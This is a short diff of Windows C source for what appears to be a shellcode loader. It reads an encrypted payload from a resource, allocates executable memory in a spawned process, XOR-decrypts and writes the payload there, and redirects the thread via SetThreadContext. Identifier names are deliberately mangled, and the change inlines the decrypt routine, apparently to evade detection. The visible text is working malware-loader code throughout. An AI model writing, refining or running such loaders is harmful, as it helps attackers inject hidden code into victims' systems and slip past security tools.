@@ -6,12 +6,6 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-void Decxxxoor(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k1e2y6Len) {
-    for (DWORD da = 0; da < c1o2d3e4Len; da++) {
-        c1o2d3e4[da] ^= k1e2y6[da % k1e2y6Len];
-    }
-}
-
 void loadResource_with(const char* renamer, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
@@ -38,7 +32,9 @@ int main() {
     GetThreadContext(pi.hThread, &ctx);
 
     LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    Decxxxoor(code199k, code199kLen, (unsigned char*)key101k, key101kLen);
+    for (DWORD da = 0; da < code199kLen; da++) {
+        code199k[da] ^= key101k[da % key101kLen];
+    }
     WriteProcessMemory(pi.hProcess, memlo, code199k, code199kLen, NULL);
     ctx.Rcx = (DWORD64)memlo; 
     SetThreadContext(pi.hThread, &ctx);
